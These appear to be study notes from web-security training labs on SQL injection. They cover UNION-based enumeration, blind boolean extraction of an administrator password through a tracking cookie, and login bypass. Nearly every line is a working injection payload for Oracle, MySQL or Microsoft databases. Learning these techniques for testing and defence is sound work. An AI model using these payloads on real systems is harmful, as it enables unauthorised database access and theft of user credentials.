# Retrieving hidden data

## simple attack 
`https://insecure-website.com/products?category=Gifts` -> `SELECT * FROM products WHERE category = 'Gifts' AND released = 1` 
=> after injecting `'+OR+1=1--` -> `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

## Examining the database

> **determine number of columns/which column contains text**: `'+UNION+SELECT+'abc','def'+FROM+dual--`
> **database version**: `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`

- On <mark style="background: #BBFABBA6;">MySQL and Microsoft</mark>
>  `'+UNION+SELECT+'abc','def'#`
>  `'+UNION+SELECT+@@version,+NULL#`
## Listing the contents 

- <mark style="background: #FF5582A6;">Oracle</mark>
>**number of columns**: `'+UNION+SELECT+'abc','def'+FROM+dual--`
>**list of tables in the database**: `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
>**details of the columns in the table**:`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--`
>**usernames and passwords for all users**: `'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--`

- <mark style="background: #FF5582A6;">non-Oracle</mark>
>`'+UNION+SELECT+'abc','def'--`
>`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
>`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
>`'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`

# Blind SQL injection
## triggering conditional responses

- let's say the original value of the cookie is `TrackingId=xyz`.
>1) **Modify the cookie**: `TrackingId=xyz' AND '1'='1` -> "Welcome back" message appears in the response
>2) **change it to**: `TrackingId=xyz' AND '1'='2` ->  "Welcome back" message does not appear in the response
>3) `TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a` ->  there is a table called `users`
>4) `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a` -> there is a user called `administrator`
>5) `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a` -> password is greater than 1 character in length.
>6) burp intruder/Repeater =>  password is 20 characters long.
>7) `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§` -> first character
>8) `TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§` ->2nd character
>And so on...

# Subverting application logic

## simple attack 
`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'` 
=> submit username as `administrator'--` -> `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`